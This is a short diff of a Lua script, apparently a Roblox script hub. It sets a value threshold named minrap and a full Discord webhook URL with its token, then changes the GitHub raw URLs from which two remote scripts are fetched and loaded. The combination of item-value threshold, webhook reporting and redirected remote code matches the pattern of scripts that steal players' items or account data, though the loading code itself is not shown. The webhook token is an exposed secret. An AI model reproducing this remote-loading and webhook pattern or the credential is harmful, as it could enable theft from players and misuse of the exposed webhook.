@@ -6,8 +6,8 @@ _G.minrap = 10000000
 _G.webhook = "https://discord.com/api/webhooks/1432831852065984673/4oetapbKqCwCCMUUKZORXzB4Bie1V2gaBt0DxC5PozHfRXVE8u8K4qK-Yan3tuw6-9Kn" -- change to your webhook
 
 -- URLs to your GitHub raw scripts
-local STRIKE_LUA_URL = "https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/main/strike.lua"
-local GUI_LUA_URL    = "https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/main/gui.lua"
+local STRIKE_LUA_URL = "https://raw.githubusercontent.com/HateME121/Strike.Hub/main/strike.lua"
+local GUI_LUA_URL    = "https://raw.githubusercontent.com/HateME121/Strike.Hub/main/gui.lua"
 
 -- Function to safely load a script from GitHub
 local function LoadScriptFromURL(url)
